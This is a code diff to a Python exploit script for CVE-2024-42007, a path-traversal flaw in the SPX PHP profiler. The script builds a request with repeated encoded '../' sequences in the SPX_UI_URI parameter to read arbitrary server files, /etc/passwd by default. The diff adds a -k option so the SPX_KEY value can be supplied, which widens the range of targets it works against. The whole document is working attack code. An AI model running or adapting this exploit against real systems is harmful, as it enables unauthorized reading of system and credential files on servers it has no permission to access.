@@ -7,10 +7,10 @@ def validate_url(target_url):
     parsed_url = urllib.parse.urlparse(target_url)
     return parsed_url.scheme in ['http', 'https']
 
-def exploit(target_url, file_to_read, detection_string):
+def exploit(target_url, file_to_read, detection_string,key):
     traversal = "%2f.." * 18
     encoded_path = urllib.parse.quote(file_to_read)
-    vuln_url = f"{target_url}/?SPX_KEY=dev&SPX_UI_URI={traversal}{encoded_path}"
+    vuln_url = f"{target_url}/?SPX_KEY={key}&SPX_UI_URI={traversal}{encoded_path}"
 
     try:
         response = requests.get(vuln_url, timeout=10, verify=False)
@@ -22,7 +22,7 @@ def exploit(target_url, file_to_read, detection_string):
         print("[+] The target is vulnerable to CVE-2024-42007!")
         return response.text
     else:
-        print("[-] The target isn't vulnerable to CVE-2024-42007.")
+        print("[-] The target isn't vulnerable to CVE-2024-42007. Try giving a key value with '-k' flag")
         return None
 
 def main():
@@ -30,6 +30,7 @@ def main():
     parser.add_argument('-t', '--target', required=True, help='Target URL (e.g. http://192.168.59.108)')
     parser.add_argument('-f', '--file', default='/etc/passwd', help='File to read (default: /etc/passwd)')
     parser.add_argument('-d', '--detect', default='root:x:0:0:root', help='Detection string (default: root:x:0:0:root)')
+    parser.add_argument('-k', '--key', default='dev',help='SPX_key from the php_info page')
 
     args = parser.parse_args()
 
@@ -37,7 +38,7 @@ def main():
         print("[-] Invalid target URL.")
         sys.exit(1)
 
-    result = exploit(args.target, args.file, args.detect)
+    result = exploit(args.target, args.file, args.detect,args.key)
     if result:
         print("[*] File contents:\n")
         print(result)
